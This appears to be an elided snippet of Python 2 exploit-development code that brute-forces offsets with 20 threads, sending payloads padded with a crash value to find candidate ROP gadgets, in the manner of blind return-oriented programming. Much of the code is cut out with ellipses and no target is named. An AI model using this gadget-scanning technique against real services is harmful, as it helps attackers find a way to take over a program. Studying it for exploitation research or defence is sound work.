...
def find_candidate_gadgets(buf_offset, offset, inf_offset):
  ...
  payload += dq(0x4141414141414141)  # something that crashes
...
def threaded_search_inf_data():
  while True:
    i = get_next()
    ret = find_candidate_gadgets(buf_offset, i, 3259)
    if ret == "PRINT":
      print hex(i), ret
    else:
      sys.stdout.write(".")
...
for i in range(20):
  threading.Thread(target=threaded_search_inf_data).start()
